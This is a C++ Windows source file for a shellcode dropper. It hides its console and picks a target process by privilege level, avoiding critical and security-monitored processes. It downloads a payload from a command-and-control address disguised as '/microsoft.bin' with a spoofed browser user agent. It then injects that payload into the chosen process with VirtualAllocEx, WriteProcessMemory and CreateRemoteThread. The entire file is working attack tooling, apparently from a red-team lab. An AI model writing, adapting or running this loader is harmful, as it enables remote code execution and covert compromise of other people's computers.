#include <iostream>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib") 

struct Shellcode {
	BYTE* pcData;
	DWORD dwSize;
};

BOOL DownloadShellcode(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
BOOL InjectShellcode(DWORD pid, Shellcode shellcode);
BOOL IsCurrentProcessElevated();
BOOL IsOtherProcessElevated(DWORD pid);
BOOL IsSystemCritical(const WCHAR* procName);
DWORD GetFirstAdminPID();
DWORD GetFirstUserPID();
DWORD GetTargetPID();

int main() {
	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // Hide console window, comment it out for debugging

	std::wcout << L"[*] 1. Analyzing environment privileges...\n";
	DWORD pid = GetTargetPID();
	//if (pid == 0) return 1; 
	if (pid == 0) {
		std::wcout << L"[-] Error: No compatible process found.\n";
		system("PAUSE");
		return 1;
	}

	std::wcout << L"[+] Target process identified. PID: " << pid << L"\n";

	struct Shellcode shellcode;
	shellcode.pcData = NULL;
	shellcode.dwSize = 0;

	std::wcout << L"[*] 2. Initializing payload download (C2)...\n";
	// if (!DownloadShellcode(L"10.200.13.204", 80, &shellcode)) return 2;

	if (!DownloadShellcode(L"10.200.13.204", 80, &shellcode)) {
		std::wcout << L"[-] Critical error during download.\n";
		system("PAUSE");
		return 2;
	}

	// if (shellcode.dwSize == 0) return 1;
	std::wcout << L"[+] Download completed successfully.\n";
	std::wcout << L"[INFO] Shellcode size: " << shellcode.dwSize << L" bytes" << std::endl;
	if (shellcode.dwSize == 0) {
		std::wcout << L"[-] Shellcode is empty!" << std::endl;
		system("PAUSE");
		return 1;
	}

	std::wcout << L"[*] 3. Starting injection sequence...\n";
	if (!InjectShellcode(pid, shellcode)) {
		std::wcout << L"[-] Injection Failed.\n";
		if (shellcode.pcData) {
			// Clean up allocated shellcode memory on failure
			free(shellcode.pcData);
			return 3;
		}
	}

	std::wcout << L"\n[+] ABSOLUTE SUCCESS! Payload executed.\n";
	std::wcout << L"[*] Check session on C2 server.\n";
	
	if (shellcode.pcData) {
		// Clean up allocated shellcode memory on success
		free(shellcode.pcData);
	}
	return 0;
}

BOOL DownloadShellcode(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
		INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	HINTERNET connection = InternetConnect(session,host,port,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);

	// Add the flags to prevent caching
	DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

	HINTERNET request = HttpOpenRequest(connection, L"GET", L"/microsoft.bin", NULL, NULL, NULL, dwFlags, 0); // Alter 3rd parameter to your payload path

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, NULL, 0)) {
		std::wcout << L"    [!] Connection failed. Retrying (" << counter + 1 << L"/3)...\n";
		counter++;
		Sleep(3000);
		if (counter >= 3) {
			InternetCloseHandle(request);
			InternetCloseHandle(connection);
			InternetCloseHandle(session);
			return 0;
		}
	}

	DWORD bufferSize = BUFSIZ;
	BYTE* buffer = new BYTE[bufferSize];

	DWORD capacity = BUFSIZ;
	BYTE* payload = (BYTE*)malloc(capacity);

	DWORD payloadSize = 0;

	if (!payload) {
		delete[] buffer;
		return 0; // malloc failed
	}

	while (true) {
		DWORD bytesRead;
		
		if (!InternetReadFile(request, buffer, bufferSize, &bytesRead)) {
			delete[] buffer;
			free(payload);
			return 0;
		}

		if (bytesRead == 0) { break; } // End of file

		// Resize payload buffer if necessary
		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			BYTE* newPayload = (BYTE*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	
	delete[] buffer;
	
	BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	(*shellcode).pcData = payload;
	(*shellcode).dwSize = payloadSize;
	return 1;	
}

BOOL InjectShellcode(DWORD pid, Shellcode shellcode) {
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (!hProcess) {
		std::wcout << L"    [-] Error opening PID " << pid << L" (Access Denied?)\n";
		return 0; 
	}

	std::wcout << L"    [+] Process handle opened.\n";

	LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteAddr) {
		std::wcout << L"    [-] VirtualAllocEx failed.\n";
		CloseHandle(hProcess);
		return 0;
	};

	std::wcout << L"    [+] Memory allocated (RWX).\n";

	if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
		std::wcout << L"    [-] WriteProcessMemory failed.\n";
		CloseHandle(hProcess);
		return 0;
	};

	std::wcout << L"    [+] Payload written to memory.\n";

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
	if (hThread != NULL) {
		std::wcout << L"    [+] Remote thread executed!\n";
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return 1;
	}

	std::wcout << L"    [-] CreateRemoteThread failed.\n";
	CloseHandle(hProcess);
	return 0;
}

BOOL IsCurrentProcessElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
			fRet = elevation.TokenIsElevated;
		}
		CloseHandle(hToken);
	}
	
	return fRet;
}

BOOL IsOtherProcessElevated(DWORD pid) {
	BOOL fRet = FALSE;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

	if (hProcess) {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD cbSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
				fRet = elevation.TokenIsElevated;
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
	
	return fRet;
}

BOOL IsSystemCritical(const WCHAR* procName) {
	// List of sensitive or protected processes (PPL) we should avoid
	const WCHAR* ignoreList[] = {
		L"smss.exe",
		L"csrss.exe",
		L"wininit.exe",
		L"services.exe",
		L"lsass.exe",
		L"winlogon.exe",
		L"svchost.exe",  // A lot of times is safe, but can be unstable 
		L"spoolsv.exe",  // Generally safe, but sometimes watched by AVs/EDRs
		L"LogonUI.exe", 
		L"sihost.exe",
		L"fontdrvhost.exe",
		L"Memory Compression",
		L"Registry"
	};

	int listSize = sizeof(ignoreList) / sizeof(ignoreList[0]);

	for (int i = 0; i < listSize; i++) {
		if (lstrcmpiW(procName, ignoreList[i]) == 0) {
			return TRUE; // Critical should not be targeted
		}
	}
	return FALSE; // Not on the list, can be a target
}

DWORD GetFirstAdminPID() {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32)) {
		do {
			// Ignores low PID processes and it self
			if (pe32.th32ProcessID <= 4 || pe32.th32ProcessID == GetCurrentProcessId()) continue;

			// Ignores critical system processes
			if (IsSystemCritical(pe32.szExeFile)) continue;

			// If elevated return process
			if (IsOtherProcessElevated(pe32.th32ProcessID)) {
				CloseHandle(hProcessSnap);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	
	CloseHandle(hProcessSnap);
	
	return 0;
}

DWORD GetFirstUserPID() {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32)) {
		do {
			// Ignores low PID processes and it self
			if (pe32.th32ProcessID <= 4 || pe32.th32ProcessID == GetCurrentProcessId()) continue;

			// Ignores critical system processes
			if (IsSystemCritical(pe32.szExeFile)) continue;

			// Tries to open to verify if we have access
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);

			if (hProcess) {
				BOOL isElevated = FALSE;

				HANDLE hToken = NULL;
				if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
					TOKEN_ELEVATION elevation;
					DWORD cbSize = sizeof(TOKEN_ELEVATION);
					if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
						isElevated = elevation.TokenIsElevated;
					}
					CloseHandle(hToken);
				}
				CloseHandle(hProcess);

				// If not elevated, we've found a User level proccess and return it
				if (!isElevated) {
					CloseHandle(hProcessSnap);
					return pe32.th32ProcessID;
				}
			}
			// If OpenProcess failed (hProcess == NULL), it is because we do not have access (probably Admin/System), so we continue.

		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return 0;
}

DWORD GetTargetPID() {
	if (IsCurrentProcessElevated()) {
		std::wcout << L"[INFO] Detected Mode: ADMINISTRATOR (Elevated)\n";
		return GetFirstAdminPID();
	}
	else {
		std::wcout << L"[INFO] Detected Mode: USER (Restricted)\n";
		return GetFirstUserPID();
	}
}
